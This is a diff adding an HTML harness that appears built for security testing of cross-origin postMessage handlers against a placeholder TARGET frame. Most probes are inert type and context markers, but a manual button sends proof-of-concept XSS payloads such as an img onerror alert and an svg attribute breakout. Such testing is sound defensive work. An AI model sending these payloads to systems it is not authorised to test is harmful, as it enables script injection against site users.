@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<!--
+  postMessage / iframe - Generic tests
+  Model: transport -> origin/source -> type -> parsing -> validation/schema -> sink -> response
+-->
+<html>
+<head>
+<meta charset="utf-8">
+<style>
+  body { font-family: monospace; }
+  #log { border:1px solid #999; padding:8px; margin-top:8px; max-height:220px;
+         overflow-y:auto; background:#111; color:#0f0; font-size:12px; }
+  button { margin:4px 4px 0 0; }
+  #exec-btn { background:#500; color:#fff; }
+</style>
+</head>
+<body>
+
+<iframe id="target" name="target" src="TARGET" style="width:100%;height:400px;border:1px solid #333;"></iframe>
+
+<div>
+  <button id="resend">Resend inert probes</button>
+  <button id="popup">Open as popup instead (if iframe is blocked)</button>
+  <button id="exec-btn">Send executable payloads (manual confirmation, watch the screen)</button>
+</div>
+<div id="log">[log] waiting for the loading...</div>
+
+<script>
+const TARGET_URL = "TARGET";
+let winRef = document.getElementById('target').contentWindow;
+
+function log(msg) {
+  const d = document.getElementById('log');
+  d.innerHTML += "<br>" + new Date().toISOString().substr(11,8) + " - " + msg;
+  d.scrollTop = d.scrollHeight;
+  console.log(msg);
+}
+
+function safeStringify(v) {
+  try { return JSON.stringify(v); }
+  catch (e) { return "[unstringifiable: " + Object.prototype.toString.call(v) + "]"; }
+}
+
+function safeSend(win, data, label) {
+  try {
+    win.postMessage(data, "*");
+  } catch (e) {
+    log("[send failed] " + label + " -> " + e.message);
+  }
+}
+
+// Inert context marker. Used to spot where the data lands (HTML/attribute/URI)
+// by searching "caido9182" in the DevTools Elements tab on the target frame
+// (cross-origin DOM access is blocked from JS, so this is a manual read).
+// Note: some of these characters can still carry meaning depending on the
+// injection context (e.g. `&` as an HTML entity, `/` in a URL) - the goal
+// is to spot WHETHER/WHERE it surfaces, not to guarantee zero interpretation.
+const CTX_MARKER_BASE = "caido9182'\"<>&`${}/\\9182done";
+
+// ---- Type / structured clone coverage ----
+// These probes use pure primitive types on purpose: an ID can't be embedded
+// in them without changing their type, which would defeat what they test.
+// Correlation for these relies on log timestamps only.
+function sendTypeProbes(win, batchId) {
+  safeSend(win, "caido9182_" + batchId + "_wildcard-probe", "wildcard-probe");
+  safeSend(win, ["caido9182", batchId], "type-array");
+  safeSend(win, {caido9182:true, _probeBatch: batchId}, "type-plain-object");
+  safeSend(win, 0, "type-number");
+  safeSend(win, null, "type-null");
+  safeSend(win, undefined, "type-undefined"); // structured-clonable, behavior depends on target's parsing
+  safeSend(win, false, "type-boolean");
+  safeSend(win, new Date(), "type-date");
+  const circular = {caido9182:true, _probeBatch: batchId}; circular.self = circular;
+  safeSend(win, circular, "type-circular"); // clonable by postMessage, can crash a downstream JSON.stringify() on the target side
+}
+
+// ---- Parsing / context (inert, safe by default) ----
+function sendContextProbes(win, batchId) {
+  const marker = CTX_MARKER_BASE + "_" + batchId;
+  safeSend(win, marker, "ctx-marker-raw");
+  ["message","data","value","payload","type"].forEach(k => {
+    safeSend(win, {[k]: marker, _probeBatch: batchId}, "ctx-marker-key-" + k);
+  });
+}
+
+// ---- Business validation/schema: intentionally out of scope ----
+// Requires reading the target's actual JS listener (grep the bundle or set a
+// DevTools breakpoint on addEventListener("message")). Not generic by nature.
+
+// ---- Sink: active confirmation, separate manual trigger ----
+function sendExecProbes(win) {
+  const batchId = crypto.randomUUID();
+  log("--- sending executable payloads [batch=" + batchId + "], watch the screen for an alert() ---");
+  safeSend(win, "<img src=x onerror=alert(document.domain)>", "sink-img");
+  safeSend(win, "<script>alert(document.domain)<\/script>", "sink-script");
+  safeSend(win, "javascript:alert(document.domain)", "sink-uri");
+  safeSend(win, "\"><svg onload=alert(document.domain)>", "sink-attr-breakout");
+}
+
+function sendChannelProbe(win, batchId) {
+  try {
+    const ch = new MessageChannel();
+    ch.port1.onmessage = (e) => log("[MessageChannel reply, batch=" + batchId + "] " + safeStringify(e.data));
+    win.postMessage({_probeBatch: batchId, msg: "caido9182_channel_probe"}, "*", [ch.port2]);
+  } catch (e) {
+    log("[MessageChannel failed] " + e.message);
+  }
+}
+
+function sendAllInert(win, trigger) {
+  const batchId = crypto.randomUUID();
+  log("--- sending inert probes [batch=" + batchId + ", trigger=" + trigger + "] ---");
+  sendTypeProbes(win, batchId);
+  sendContextProbes(win, batchId);
+  sendChannelProbe(win, batchId);
+}
+
+// ---- Response: collector, protected against a stringify that crashes ----
+window.addEventListener("message", (e) => {
+  log("[caught] origin=" + e.origin + " data=" + safeStringify(e.data));
+});
+
+document.getElementById('target').addEventListener('load', () => {
+  sendAllInert(winRef, "initial");
+  setTimeout(() => sendAllInert(winRef, "retry-1s"), 1000);
+  setTimeout(() => sendAllInert(winRef, "retry-3s"), 3000);
+});
+
+document.getElementById('resend').addEventListener('click', () => sendAllInert(winRef, "manual"));
+document.getElementById('exec-btn').addEventListener('click', () => sendExecProbes(winRef));
+
+document.getElementById('popup').addEventListener('click', () => {
+  const p = window.open(TARGET_URL, "_blank");
+  log("popup opened, wait for it to load then click Resend again (no reliable cross-origin load detection for a popup, see note above)");
+  setTimeout(() => { winRef = p; sendAllInert(winRef, "popup-2s-guess"); }, 2000);
+});
+</script>
+
+<!-- Null-origin x2: both send TO the target frame named "target". -->
+<iframe sandbox="allow-scripts" srcdoc="
+  <script>
+    parent.frames['target'].postMessage('caido9182_null_origin_srcdoc', '*');
+  <\/script>
+"></iframe>
+
+<iframe src="data:text/html,<script>parent.frames['target'].postMessage('caido9182_null_origin_datauri','*')<\/script>"></iframe>
+
+</body>
+</html>
